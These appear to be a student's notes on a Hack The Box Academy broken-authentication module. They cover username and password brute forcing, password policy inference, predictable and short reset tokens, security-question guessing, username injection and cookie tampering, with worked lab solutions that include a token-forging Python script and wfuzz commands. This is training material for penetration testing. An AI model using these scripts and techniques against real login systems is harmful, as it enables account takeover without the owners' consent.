wfuzz -w /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -u 'http://64.227.34.91:30068/question2/' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://64.227.34.91:30068' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://64.227.34.91:30068/question2/' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -d 'Username=FUZZ&wronguser=&count=1&Password=testt' --hs "wronguser"
```

## Bruteforcing Passwords

After having success at **username enumeration**, an attacker is often just one step from the goal of bypassing authentication, and that step is the user’s password. Passwords are the primary, when not the only one, security measure for most applications. Despite its popularity, this measure is not always perceived as important by both end-users and administrators/maintainers. Therefore, the attention it receives is usually not enough. Wikipedia has a [page](https://en.wikipedia.org/wiki/List_of_the_most_common_passwords) that lists the most common passwords with a leaderboard for every year starting from 2011. If you have a quick look at this [table](https://en.wikipedia.org/wiki/List_of_the_most_common_passwords#SplashData) you can see that people are not so careful.

### Password Issues

Historically speaking, passwords suffered from three significant issues. The first one lies in the name itself. Very often, users think that a password can be just a word and not a phrase. The second issue is that users mostly set passwords that are easy to remember. Such passwords are usually weak or follow a predictable pattern. Even if a user chooses a more complex password, it will usually be written on a Post-it or saved in cleartext. It is also not that uncommon to find the password written in the hint field. The second password issue gets worse when a frequent password rotation requirement to access enterprise networks comes into play. This requirement usually results in passwords like Spring2020, Autumn2020 or CompanynameTown1, CompanynameTown2 and so forth.

Historically speaking, passwords suffered from three significant issues. The first one lies in the name itself. Very often, users think that a password can be just a word and not a phrase. The second issue is that users mostly set passwords that are easy to remember. Such passwords are usually weak or follow a predictable pattern. Even if a user chooses a more complex password, it will usually be written on a Post-it or saved in cleartext. It is also not that uncommon to find the password written in the hint field. The second password issue gets worse when a frequent password rotation requirement to access enterprise networks comes into play. This requirement usually results in passwords like `Spring2020`, `Autumn2020` or `CompanynameTown1`, `CompanynameTown2` and so forth.

Recently [NIST](https://pages.nist.gov/800-63-3/sp800-63b.html), the National Institute of Standards and Technology refreshed its guidelines around password policy testing, password age requirements, and password composition rules.

The relevant change is:
```
Verifiers SHOULD NOT impose other composition rules (e.g., requiring mixtures of different character types or prohibiting consecutively repeated characters) for memorized secrets. Verifiers SHOULD NOT require memorized secrets to be changed arbitrarily (e.g., periodically).
```
Finally, it is a known fact that many users reuse the same password on multiple services. A password leak or compromise on one of them will give an attacker access to a wide range of websites or applications. This attack is known as **Credential stuffing** and goes hand in hand with wordlist generation, taught in the [Cracking Passwords with Hashcat module](https://academy.hackthebox.com/course/preview/cracking-passwords-with-hashcat). A viable solution for storing and using complex passwords is password managers. Sometimes you may come across weak password requirements. This usually happens when there are additional security measures in place. An excellent example of that is ATMs. The password, or better the PIN, is a just sequence of 4 or 5 digits. Pretty weak, but lack of complexity is balanced by a limitation in total attempts (no more than 3 PINs before losing physical access to the device).

### Policy Inference

The chances of executing a successful brute force attack increase after a proper policy evaluation. Knowing what the minimum password requirements are, allows an attacker to start testing only compliant passwords. A web app that implements a strong password policy could make a brute force attack almost impossible. As a developer, always choose long passphrases over short but complex passwords. On virtually any application that allows self-registration, it is possible to infer the password policy by registering a new user. Trying to use the username as a password, or a very weak password like `123456`, often results in an error that will reveal the policy (or some parts of it) in a human-readable format.

Policy requirements define how many different families of characters are needed, and the length of the password itself.

Families are:
* lowercase characters, like `abcd..z`
* uppercase characters, like `ABCD..Z`
* digit, numbers from `0 to 9`
* special characters, like `,./.?!` or any other printable one (`space` is a char!)

It is possible that an application replies with a `Password does not meet complexity requirements` message at first and reveals the exact policy conditions after a certain number of failed registrations. This is why it is recommended to test three or four times before giving up.

The same attack could be carried on a password reset page. When a user can reset her password, the reset form may leak the password policy (or parts of it). During a real engagement, the inference process could be a guessing game. Since this is a critical step, we are providing you with another basic example. Having a web application that lets us register a new account, we try to use `123456` as a password to identify the policy. The web application replies with a `Password does not match minimum requirements` message. A policy is obviously in place, but it is not disclosed.

We then start guessing the requirements by registering an account and entering a keyboard walk sequence for the password like `Qwertyiop123!@#`, which is actually predictable but long and complex enough to match standard policies.

Suppose that the web application accepts such passwords as valid. Now let’s decrease complexity by removing special characters, then numbers, then uppercase characters, and decreasing the length by one character at a time. Specifically, we try to register a new user using `Qwertyiop123`, then `Qwertyiop!@#`, then `qwertyiop123`, and so forth until we have a matrix with the minimum requirements. While testing web applications, also bear in mind that some also limit password length by forcing users to have a password between 8 and 15 characters. This process is prone to error, and it is also possible that some combinations will not be tested while others will be tested twice. For this reason, it is recommended to use a table like this to keep track of our tests:

| Tried | Password | Lower | Upper | Digit | Special | >=8chars | >=20chars |
| ----- | -------- | ----- | ----- | ----- | ------- | -------- | --------- |
| Yes/No | `qwerty` | X | | | | | |
| Yes/No | `Qwerty` | X | X | | | | |
| Yes/No | `Qwerty1` | X | X | X | | | |
| Yes/No | `Qwertyu1` | X | X | X | | X | |
| Yes/No | `Qwert1!` | X | X | X | X | | |
| Yes/No | `Qwerty1!` | X | X | X | X | X | |
| Yes/No | `QWERTY1` | | X | X | | | |
| Yes/No | `QWERT1!` | | X | X | X | | |
| Yes/No | `QWERTY1!` | | X | X | X | X | |
| Yes/No | `Qwerty!` | X | X | | X | | |
| Yes/No | `Qwertyuiop12345!@#$%` | X | X | X | X | X | X |

Within a few tries, we should be able to infer the policy even if the message is generic. Let us now suppose that this web application requires a string between 8 and 12 characters, with at least one uppercase and lowercase character. We now take a giant wordlist and extract only passwords that match this policy. Unix `grep` is not the fastest tool but allows us to do the job quickly using POSIX regular expressions. The command below will work against `rockyou-50.txt`, a subset of the well-known rockyou password leak present in SecLists. This command finds lines have at least one uppercase character (`'[[:upper:]]'`), and then only lines that also have a lowercase one (`'[[:lower:]]'`) and with a length of 8 and 12 chars (`'^.{8,12}$'`) using extended regular expressions (`-E`):
```
user@htb[/htb]$ grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep -E '^.{8,12}$'

416712
```
We see that starting from the standard `rockyou.txt`, which contains more than 14 million lines, we have narrowed it down to roughly 400 thousand. If you want to practice yourself, download the PHP script [here](https://academy.hackthebox.com/storage/modules/80/password_policy_php.txt) and try to match the policy. We suggest keeping the table we just provided handy for this exercise.

### Perform an Actual Bruteforce Attack

Now that we have a username, we know the password policy and the security measures in place, we can start brute-forcing the web application. Please bear in mind that **you should also check if an anti-CSRF token protects the form and modify your script to send such a token**.

## Predictable Reset Token

Reset tokens (in the form of a code or temporary password) are secret pieces of data generated mainly by the application when a password reset is requested. A user must provide it to prove their identity before actually changing their credentials. Sometimes applications require you to choose one or more security questions and provide an answer at the time of registration. If you forgot your password, you could reset it by answering these questions again. We can consider these answers as tokens too.

This function allows us to reset the actual password of the user without knowing the password. There are several ways this can be done, which we will discuss soon.

A password reset flow may seem complicated since it usually consists of several steps that we must understand. Below, we created a basic flow that recaps what happens when a user requests a reset and receives a token by email. Some steps could go wrong, and a process that looks safe can be vulnerable.

![reset_flow2](https://academy.hackthebox.com/storage/modules/80/reset_flow2.png)

### Reset Token by Email

If an application lets the user reset her password using a URL or a temporary password sent by email, it should contain a robust token generation function. Frameworks often have dedicated functions for this purpose. However, developers often implement their own functions that may introduce logic flaws and weak encryption or implement security through obscurity.

### Weak Token Generation

Some applications create a token using known or predictable values, such as local time or the username that requested the action and then hash or encode the value. This is a poor security practice because a token doesn't need to contain any information from the actual user to be validated and should be a pure-random value. In the case of reversible encoding, it could be enough to decode the token to understand how it is built and forge a valid one.

As penetration testers, we should be aware of these types of poor implementations. We should try to brute force any weak hash using known combinations like time+username or time+email when a reset token is requested for a given user. Take for example this PHP code. It is the logical equivalent of the vulnerability reported as [CVE-2016-0783](https://www.cvedetails.com/cve/CVE-2016-0783/) on Apache OpenMeeting:
```php
<?php
function generate_reset_token($username) {
  $time = intval(microtime(true) * 1000);
  $token = md5($username . $time);
  return $token;
}
```
It is easy to spot the vulnerability. An attacker that knows a valid username can get the server time by reading the `Date` header (which is almost always present in the HTTP response). The attacker can then brute force the `$time` value in a matter of seconds and get a valid reset token. In this example, we can see that a common request leaks date and time:
![07-http_header_date](https://academy.hackthebox.com/storage/modules/80/07-http_header_date.png)

Let's take as an example the PHP code downloadable [here](https://academy.hackthebox.com/storage/modules/80/scripts/reset_token_time_php.txt). The application generates a token by creating an md5 hash of the number of seconds since epoch (for demonstration purposes, we just use a time value). Reading the code, we can easily spot a vulnerability similar to the OpenMeeting one. Using the [reset_token_time.py](https://academy.hackthebox.com/storage/modules/80/scripts/reset_token_time_py.txt) script, we could gain some confidence in creating and brute-forcing a time-based token. Download both scripts and try to get the welcome message.

Please bear in mind that any header could be stripped or altered by placing a reverse proxy in front of the application. However, we often have the chance to infer time in different ways. These are the time of a sent or received in-app message, an email header, or last login time, to name a few. Some applications do not check for the token age, giving an attacker plenty of time for a brute force attack. **It has also been observed that some applications never invalidate or expire tokens**, even if the token has been used. Retaining such a critical component active is quite risky since an attacker could find an old token and use it.

### Short Tokens

Another bad practice is the use of short tokens. Probably to help mobile users, an application might generate a token with a length of 5/6 numerical characters that sometimes could be easily brute-forced. In reality, there is no need to use a short one because tokens are received mainly by e-mail and could be embedded in an HTTP link that can be validated using a simple GET call like `https://127.0.0.1/reset.php?token=any_random_sequence`. A token could, therefore, easily be a sequence of 32 characters, for example. Let us consider an application that generates tokens consisting of five digits for the sake of simplicity. Valid token values range from 00000 to 99999. At a rate of 10 checks per second, an attacker can brute force the entire range in about 3 hours.

Also, consider that the same application replies with a `Valid token` message if the submitted token is valid; otherwise, an `Invalid token` message is returned. If we wanted to perform a brute force attack against the abovementioned application’s tokens, we could use `wfuzz`. Specifically, we could use a string match for the case-sensitive string Valid (`--ss` "Valid"). Of course, if we did not know how the web application replies when a valid token is submitted, we could use a “reverse match” by looking for any response that does not contain `Invalid token` using `--hs` "Invalid." Finally, a five-digit integer range can be specified and created in `wfuzz` using `-z range,00000-99999`. You can see the entire `wfuzz` command below:
```
user@htb[/htb]$ wfuzz -z range,00000-99999 --ss "Valid" "https://brokenauthentication.hackthebox.eu/token.php?user=admin&token=FUZZ"

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://brokenauthentication.hackthebox.eu/token.php?user=admin&token=FUZZ
Total requests: 100000
===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================
00011112:   200        0 L      5 W      26 Ch       "11111"
00017665:   200        0 L      5 W      28 Ch       "17664"
^C
Finishing pending requests...
```
An attacker could obtain access as a user before the morning coffee by executing the above brute force attack at night. Both the user and a sysadmin that checks logs and network traffic will most probably notice an anomaly, but it could be too late. This edge case may sound unrealistic, but you will be surprised by the lack of security measures in the wild. Always try to brute force tokens during your tests, considering that such an attack is loud and can also cause a Denial of Service, so it should be executed with great care and possibly only after conferring with your client.

### Weak Cryptography
Even cryptographically generated tokens could be predictable. It has been observed that some developers try to create their own crypto routine, often resorting to security through obscurity processes. Both cases usually lead to weak token randomness. Also, some cryptographic functions have proven to be less secure. Rolling your own encryption is never a good idea. To stay on the safe side, we should always use modern and well-known encryption algorithms that have been heavily reviewed. A fascinating use case on attacks against weak cryptography is the research performed by by F-Secure lab on OpenCart, published [here](https://labs.f-secure.com/advisories/opencart-predictable-password-reset-tokens/).

Researchers discovered that the application uses the [mt_rand()](https://www.php.net/manual/en/function.mt-rand.php) PHP function, which is known to be [vulnerable](https://phpsecurity.readthedocs.io/en/latest/Insufficient-Entropy-For-Random-Values.html) due to lack of sufficient entropy during the random value generation process. OpenCart uses this vulnerable function to generate all random values, from CAPTCHA to session_id to reset tokens. Having access to some cryptographically insecure tokens makes it possible to identify the seed, leading to predicting any past and future token.

Attacking mt_rand() is not an easy task by any means, but proof of concept attacks have been released [here](https://github.com/GeorgeArgyros/Snowflake) and [here](https://download.openwall.net/pub/projects/php_mt_seed/). mt_rand() should be therefore used with caution and taking into account the security implications. The OpenCart example was a serious case since an attacker could easily obtain some values generated using mt_rand() through CAPTCHA without even needing a valid user account.

### Reset Token as Temp Password

It should be noted that some applications use reset tokens as actual temporary passwords. By design, any temporary password should be invalidated as soon as the user logs in and changes it. It is improbable that such temporary passwords are not invalidated immediately after use. That being said, try to be as thorough as possible and check if any reset tokens being used as temporary passwords can be reused.

There are higher chances that temporary passwords are being generated using a predictable algorithm like mt_rand(), md5(username), etc., so make sure you test the algorithm’s security by analyzing some captured tokens.

### Exercise

Question 1: Create a token on the web application exposed at subdirectory /question1/ using the *Create a reset token for htbuser* button. Within an interval of +-1 second a token for the htbadmin user will also be created. The algorithm used to generate both tokens is the same as the one shown when talking about the Apache OpenMeeting bug. Forge a valid token for htbadmin and login by pressing the "Check" button. What is the flag?

Solution: As suggestion, we know that the creation of the tokens is based on Apache OpenMeeting. For first, we tried to build a PHP script for calculating the logic of creation of `htbuser` tokens by starting from the Apache OpenMeeting PHP example:
```php
<?php
function generate_reset_token($username) {
  $time = intval(microtime(true) * 1000);
  $token = md5($username . $time);
  return $token;
}
```
From here, we note that the $time is converted from seconds to milliseconds (`*1000`) and then `$username` is concatenated with `$time` (e.g. `htbuser1234567890123`).

At this point we created a new PHP script and we tried to compare a htbuser token we created on the target website and we compared it with all the tokens we generated by our PHP algorithm in the following way:
```php
<?php
function generate_reset_token($username) {
  //echo microtime(true) . "\n";
  //echo microtime() . "\n";
  $time = intval(microtime(true) * 1000);
  $time = 1647135274 * 1000; //convert from seconds to milliseconds (1647135274 corresponds to 2022-3-13 at 1:34:34 from epoch time in seconds)
  $token_to_compare = "d24f7f6ad0fa0b400b9d2e268c0721c2"; //This token has been generated on 2022-3-13 at 1:34:34
  
  //Now let's compute all the token for all the milliseconds
  for ($i = 0; $i <= 999; $i++) {
    $token = md5($username . $time);
    if(strcmp($token,$token_to_compare) == 0){
    	echo "TIME OK: $time\n";
    	echo "Input: $username" . "$time\n";
  		echo "Token: $token"; 
    	return $token;
    }
    $time++;
  }
  echo "Failed search\n";
  return NULL;
}
generate_reset_token("htbuser");
?>
```
Note that here **the algorithm works with my localtime** (so I think the localtime of the user).

Now that we proved the logic of the algorithm for generating tokens, let's try to do the same also for htbadmin. For doing this, we started from the `reset_token.py` script shown in the previous section and we edited it accordingly to the logic discovered by the PHP script above.

Before report the script, I explain my finding: the text of the question says that the htbadmin token is created when I request a token for htbuser within a +-1 second of interval. It means, that for first I should do a POST request for asking a htbuser token, then I can try to bruteforce the token of htbadmin. Remember that the time must be in milliseconds, so, since I should check the interval +-1 second, it means I should use `start_time = now - 1000` (-1000 milliseconds) and the for loop must loop for furter +1000 milliseconds. Furthermore, here **the time is not my localtime but it is UTC time** (I guess the time of the target machine or htbadmin). So, in general, in real cases we should try always to test all UTCs time zones.

The edited `reset_token.py` is the following:
```python
from hashlib import md5
import requests
from sys import exit
import sys
from time import time

url = "http://64.227.34.91:31647/question1/"
user = "htbuser"
admin_user = "htbadmin"
UTC_value = 3600 #UTC + 1 in my case to be added in now variable (e.g. now = int((time()+UTC_value)*1000)). No need for this exercise because the algorithm for htbadmin token is based on UTC, not on my localtime.

# to have a wide window try to bruteforce starting from 120seconds ago
now        = int((time())*1000)
start_time = now - 3000 # Remember our conversion to milliseconds, so our start time starts from 1 sec = 1000 ms in the past
success_user_token_text = "Your token is"
fail_admin_token_text  = "Wrong token"

# 1- Ask for htbuser token (otherwise the htbadmin token is not created)
data = {
    "submit": user
}
    
# send the request
res = requests.post(url, data=data)
# response text check
if not success_user_token_text in res.text:
    print(res.text)
    print("[*] Error! Token creation failed!")
    exit()


# loop from start_time to now. + 1000 milliseconds (= + 1 second) is needed because of how range() works
for x in range(start_time, now + 3000):
    
    # get token md5

    md5_token = md5((admin_user+str(x)).encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(str(x), md5_token))

    # send the request
    res = requests.post(url, data=data)

    # response text check
    if not fail_admin_token_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        print("Time is: "+str(x))
        exit()
```
Running this Python script, we can get the right response and the flag.

A useful script that could help us to translate dateformat and seconds is the following:
```python
import time

import datetime
t = datetime.datetime(2022, 3, 13, 2, 34, 34) #Change this value
seconds = (t - datetime.datetime.fromtimestamp(0)).total_seconds()
print("Check seconds: "+str(seconds))

my_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(1647135274)) #Change this value

print(my_time)
```
It is useful for converting a date in seconds and also for convering seconds to date (useful for checking also if our epoch time (in seconds) is UTC or UTC+N).

If you are using TimeVerter, the correct command should be:
```
python timeverter.py -U +0:00 -r 3000 -g md5 -X POST -u http://206.189.25.173:32523/question1/ -d 'submit=check&token=VERTER' -fr "Wrong token" -mul 1000 -p htbadmin
```

Question 2: Request a reset token for htbuser and find the encoding algorithm, then request a reset token for htbadmin to force a password change and forge a valid temp password to login. What is the flag?

Solution: get the temporary password of the user by using the "Forgot Password" option. Then, by using Cyberchef, the encoding path is: From Base64 -> From HEX.
Remember: that Base64 string is a temporary PASSWORD, so you can use it directly for authenticating as htbuser. At this point, you can build the same encoded string for htbadmin by using CyberChef. Once you did this, try to login as htbadmin by using that Base64-encoded string as password and you'll get tha flag. This method works because these Base64-encoded strings are used as "temporary passwords".

# Password Attacks

## Authentication Credentials Handling

By authentication credentials handling, we mean how an application operates on passwords (password reset, password recovery, or password change). A password reset, for example, could be an easy but loud way to bypass authentication.

Speaking about typical web applications, users who forget their password can get a new one in three ways when no external authentication factor is used.
1. By requesting a new one that will be sent via email by the application
2. By requesting a URL that will allow them to set a new one
3. By answering prefilled questions as proof of identity and then setting a new one

As penetration testers, we should always look for logic flaws in "forgot password" and "password change" functionalities, as they may allow us to bypass authentication.

## Guessable Answers

Often web applications authenticate users who lost their password by requesting that they answer one or multiple questions. Those questions, usually presented to the user during the registration phase, are mostly hardcoded and cannot be chosen by them. They are, therefore, quite generic.

Assuming we had found such functionality on a target website, we should try abusing it to bypass authentication. In these cases, the problem, or rather the weak point, is not the function per se but the predictability of questions and the users or employees themselves. It is common to find questions like the below:
* "`What is your mother's maiden name?`"
* "`What city were you born in?`"

The first one could be found using **OSINT**, while the answer to the second one could be identified again using **OSINT** or via a brute-force attack. Admittedly, answering both questions could be performed without knowing much about the target user.

We discourage the use of security answers because even when an application allows users to choose their questions, answers could still be predictable due to users’ negligence. To raise the security level, a web application should keep repeating the first question until the user answers correctly. This way, an attacker who is not lucky enough to know the first answer or come across a question that can be easily brute-forced on the first shot cannot try the second one. When we find a web application that keeps rotating questions, we should collect them to identify the easiest to brute force and then mount the attack.

Scraping a website could be quite complicated because some web applications scramble form data or use JavaScript to populate forms. Some others keep all question details stored on the server-side. Therefore, we should build a brute force script utilizing a helper, like when there is an Anti-CSRF token present. We prepared a basic web page that rotates questions and a Python template that you can use to experiment with this attack. You can download the PHP file [here](https://academy.hackthebox.com/storage/modules/80/scripts/predictable_questions_php.txt) and Python code [here](https://academy.hackthebox.com/storage/modules/80/scripts/predictable_questions_py.txt). Take the time to understand how the web application functions fully. We suggest trying manually and then writing your own script. Use someone else’s script only as a last resort.

## Username Injection

When trying to understand the high-level logic behind a reset form, it is unimportant if it sends a token, a temporary password, or requires the correct answer. At a high level, when a user inputs the expected value, the reset functionality lets the user change the password or pass the authentication phase. The function that checks if a reset token is valid and is also the right one for a given account is usually carefully developed and tested with security in mind. However, it is sometimes vulnerable during the second phase of the process, when the user resets the password after the first login has been granted.

Imagine the following scenario. After creating an account of our own, we request a password reset. Suppose we come across a form that behaves as follows:
```
https://brokenauthentication.hackthebox.eu/reset.php
```
![10-reset](https://academy.hackthebox.com/storage/modules/80/10-reset.png)

We can try to inject a different username and/or email address, looking for a possible hidden input value or guessing any valid input name. It has been observed that some applications give precedence to received information against information stored in a session value.

An example of vulnerable code looks like this (the `$_REQUEST` variable contains both `$_GET` and `$_POST`):
```php
<?php
  if isset($_REQUEST['userid']) {
	$userid = $_REQUEST['userid'];
  } else if isset($_SESSION['userid']) {
	$userid = $_SESSION['userid'];
  } else {
	die("unknown userid");
  }
```

This could look weird at first but think about a web application that allows admins or helpdesk employees to reset other users' passwords. Often, the function that changes the password is reused and shares the same codebase with the one used by standard users to change their password. An application should always check authorization before any change. In this case, it has to check if the user has the grants to modify the password for the target user. Often, the function that changes the password is reused and shares the same codebase with the one used by standard users to change their password. With this in mind, you should enumerate the web application to identify how it expects the username or email field during the login phase, when there are messages or communication exchange, or when you see other users' profiles. Having collected a list of all possible input field names, we will attack the application. The attack will be executed by sending a password reset request while logged in with our user and injecting the target user's email or username through the possible field names (one at a time).

We brute-forced the username and password on a web application that uses `userid` as a field name during the login process in previous exercises. Let us keep this field as an identifier of the user and operate on it. A standard request looks as follows:
![username_injection_req1](https://academy.hackthebox.com/storage/modules/80/username_injection_req1.png)

If you tamper with the request by adding the `userid` field, you can change the password for another user:
![username_injection_req2](https://academy.hackthebox.com/storage/modules/80/username_injection_req2.png)

As we can see, the application replies with a success message.

When we have a small number of fields and user/email values to test, you can mount this attack using an intercepting proxy. If you have many of them, you can automate the attack using any fuzzer or a custom script. We prepared a small playground to let you test this attack. You can download the PHP script [here](https://academy.hackthebox.com/storage/modules/80/scripts/username_injection_php.txt) and Python script [here](https://academy.hackthebox.com/storage/modules/80/scripts/username_injection_py.txt). Take your time to study both files, then try to replicate the attack we showed.

# Session Attacks

## Bruteforcing Cookies

When the HTTP protocol was born, there was no need to track connection states. A user requested a resource, the server replied, and the connection was closed. It was 1991, and websites were quite different from what we are used to today. As you can imagine, almost no modern web application could work this way because they serve different content based on who requests it. A shopping cart, preferences, messages, etc., are good examples of personalized content. Fortunately, while developing the first e-commerce application, the precursor of WWW wrote a new standard, **cookies**.

Back then, a cookie, sent as a header at each request from the browser to the web application, was used to hold all user session details, such as their shopping cart, including chosen products, quantity, and pricing. Issues emerged very soon. The main concern nowadays is security. We know that one cannot trust the client when it comes to authorizing a modification or a view, but back then, the problem was also regarding the request's size. Cookies then started to be lighter and be set as a unique identifier that refers to a **session** stored on the server-side. When a visitor shows their cookies, the application checks any details by looking at the correct session on the server-side.

While we know that a web application could set many cookies, we also know that usually, **one or two** are relevant to the session. Session-related cookies are used to "discriminate" users from each other. Other cookies could be related to language, information about acceptance of Privacy, or a cookie disclaimer, among others. These cookies could be altered with no significant impact since they are not related to application security.

We know that other ways also exist to track users, for example, the already discussed **HTTP Authentication** or an in-page token like **ViewState. HTTP Authentication** is not common on Internet-facing applications, at least not as the primary layer for authentication. However, it could be the proper security barrier if we want to protect a web application **before** a user even reaches the login form.

[ViewState](https://www.w3big.com/aspnet/aspnet-viewstate.html) is an excellent example of an in-page security token, used by default by **.NET** web applications like any SharePoint site. **ViewState** is included as a hidden field in HTML forms. It is built as a serialized object containing useful information about the current user/session (where the user came from, where the user can go, what the user can see or modify, etc.) A **ViewState token** could be easily decoded if it is not encrypted. However, the main concern is that it could suffer from a vulnerability that leads to remote code execution even if it is encrypted. Session cookies can suffer from the same vulnerabilities that may affect password reset tokens. They could be predictable, broken, or forged.

### Cookie token tampering

Like password reset tokens, session tokens could also be based on guessable information. Often, homebrewed web applications feature custom session handling and custom cookie-building mechanisms to have user-related details handy. The most common piece of data we can find in cookies is user grants. Whether a user is an admin, operator, or basic user, this is information that can be part of the data used to create the cookie.

Unfortunately, as already discussed, it is not rare to see tokens generated from important values, such as userid, grants, time, etc. Imagine a scenario where part of a web application’s functionality is to get back the plaintext from an encoded/encrypted value. This means that one-way encryption such as hashing is out of the question. Of course, there is no real reason to store data in session cookies because everything that is part of the session should be handled and validated server-side, and their content should be completely random.

Let us consider the following example.

![11-cookielogin](https://academy.hackthebox.com/storage/modules/80/11-cookielogin.png)

Line 4 of the server’s response shows a `Set-Cookie` header that sets a `SESSIONID` to `757365723A6874623B726F6C653A75736572`. If we decode this hex value as ASCII, we see that it contains our `userid:htb`, and `role` (standard `user`):
```
user@htb[/htb]$ echo -n 757365723A6874623B726F6C653A75736572 | xxd -r -p; echo

user:htb;role:user
```
We could try escalating our privileges within the application by modifying the `SESSIONID` cookie to contain `role:admin`. This action may even allow us to bypass authentication altogether.

### Remember me token

We could consider a `rememberme` token as a session cookie that lasts for a longer time than usual. `rememberme` tokens usually last for at least seven days or even for an entire month. Given their long lifespan, `rememberme` tokens could be easier to brute force. If the algorithm used to generate a `rememberme` token or its length is not secure enough, an attacker could leverage the extended timeframe to guess it. Almost any attack against password reset tokens and generic cookies can also be mounted against `rememberme` tokens, and the security measures a developer should put in place are almost the same.

### Encrypted or encoded token

Cookies could also contain the result of the encryption of a sequence of data. Of course, a weak crypto algorithm could lead to privilege escalation or authentication bypass, just like plain encoding could. The use of weak crypto will slow an attacker down. For example, we know that ECB ciphers keep some original plaintext patterns, and CBC could be attacked using a [padding oracle attack](https://en.wikipedia.org/wiki/Padding_oracle_attack).

Often web applications encode tokens. For example, some encoding algorithms, such as hex encoding and base64, can be recognized by a trained eye just by having a quick look at the token itself. Others are more tricky. A token could be somehow transformed using, for example, XOR or compression functions before being encoded. We suggest always checking for magic bytes when you have a sequence of bytes that looks like junk to you since they can help you identify the format. Wikipedia has a list of common [file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) to help us with the above.

Take this recipe at [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)To_Hex('Space',0)Gunzip(/breakpoint)&input=SDRzSUFDNGtLR0FBL3dYQU1RMEFBQURDTUxVb29QYVB4UzRNZm4vWUJBQUFBQT09). The token is a valid base64 string, that results in a set of apparently useless hex bytes. Magic bytes are `1F 8B`, a quick search on Wikipedia’s file signatures page indicates that it could be a gzipped text. By pausing `To hex` and activating `Gunzip` inside the CyberChef recipe we just linked, we can see that it is indeed gzipped content.

As said, a trained eye will probably spot encoders just by looking at the string. [Decodify](https://github.com/s0md3v/Decodify) is a tool written to automate decode guessing. It doesn't support many algorithms but can easily help to spot some basic ones. CyberChef offers a massive list of decoders, but they should be used manually and checked one at a time.

Start with a basic example on this [recipe](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto'/breakpoint)Bzip2_Decompress(false/breakpoint)&input=NDI1YTY4MzkzMTQxNTkyNjUzNTkwOWExYWM0NDAwMDAwMzBiODAxNjIwMTA5MDFkMTI0MDAwMjAwMDIyODY0ZjQ4M2RhYTEwMDAwMmE1MzlkYTYwOGYwY2Y4YmI5MjI5YzI4NDgwNGQwZDYyMjA) at CyberChef. The recipe start with component paused so we can do one step at time. Note: for un-pause, just click on the `||` icon to unset the breakpoint.

Encoded text contains chars that don't look like printable ASCII hex code (ASCII printable) that could be printed on a terminal and is in the range from 0x20 to 0x7f). We can see some 0x00 and 0x09 that are outside the printable range. We, therefore, should exclude any Base* algorithm, like Base64 or Base32, because they are built with a subset of printable ASCII. The string still looks like a hex-encoded one, so we can try to force a From hex operation by un-pausing the first block by clicking the pause button to grey it out. As expected, all we have is junk. Inspecting the string, we can see that it starts with 42 5a. Checking Wikipedia [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) page looking for those two bytes, also called Magic bytes, we see that they refer to the bzip algorithm. Having found a possible candidate, we un-pause. Second step: Bzip2 decompress. The resulting string is ZW5jb2Rpbmdfcm94 and doesn't tell us much: there could be another encoding step. We know that when there is the need to move data to and from a web application, a very common encoder is Base64, so we try to give it a shot.

Search for **Base64** in the upper-left search form and drag&drop `From Base64` to our recipe: we have our string decoded, as you can see.

To become more comfortable with CyberChef, we suggest practicing by encoding with different algorithms and reversing the flow.

Sometimes cookies are set with random or pseudo-random values, and an easy decode doesn't lead to a successful attack. That's why we often need to automate the creation and test of such cookies. Assume we have a web app that creates persistent cookies starting from the string `user_name:persistentcookie:random_5digit_value`, then encodes as base64 apply ROT13 and converts to hexadecimal to stores it in a database so it could be checked later. And assume we know, or suspect, that `htbadmin` used a persistent cookie. ROT13 is a special case of Caesar Cypher where every char is rotated by 13 positions. It was quite commonly used in the past, but even though it's almost dead nowadays, it is an interesting alternative to bz2 compression for this example.

Even if the space of random values is very small, a manual test is out of the question. Therefore we created a Python proof of concept to show the possible flow to automate this type of attack. Download [automate_cookie_tampering.py](https://academy.hackthebox.com/storage/modules/80/scripts/automate_cookie_tampering_py.txt) script, read and understand the code.

Often when developers think about encryption, they see it as a strong security measure. Still, in this case they miss the context: given that there is really no need to store data in session cookies and they should be pure random, there is no need to encrypt or encode them.

### Weak session token

Even when cookies are generated using strong randomization, resulting in a difficult-to-guess string, it could be possible that the token is not long enough. This could be a problem if the tested web application has many concurrent users, both from a functional and security perspective. Suppose space is not enough because of the [Birthday paradox](https://en.wikipedia.org/wiki/Birthday_problem). In that case, two users might receive the same token. The web application should always check if a newly generated one already exists and regenerate it if this is the case. This behavior makes it easier for an attacker to brute force the token and obtain a valid one.

Following the example we saw when talking about **Short token** on the **Predictable reset token** section, we could try to brute force a session cookie. The time needed would depend on the length and the charset used to create the token itself. Given this is a guessing game, we think a truly incremental approach that starts with `aaaaaa` to `zzzzzz` would not pay dividends. That is why we prefer to use `John the Ripper`, which generates non-linear values, for our brute-forcing session.

We should examine some cookie values, and after having observed that the length is six and the charset consists of lowercase chars and digits, we can start our attack.

